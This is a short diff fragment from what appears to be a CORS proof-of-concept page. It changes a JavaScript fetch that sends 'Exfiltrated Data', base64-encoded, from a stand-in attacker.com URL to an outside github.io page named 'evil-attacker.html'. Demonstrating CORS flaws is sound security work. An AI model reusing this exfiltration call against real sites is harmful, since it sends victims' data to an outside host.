@@ -13,7 +13,7 @@
         .then(data => {
           console.log("Exfiltrated Data:", data);
           // Attacker could send this to their own server
-          fetch("https://attacker.com/log?data=" + btoa(data));
+          fetch("https://mohammed-ishfaq.github.io/cors-poc/evil-attacker.html" + btoa(data));
         });
       }
     </script>
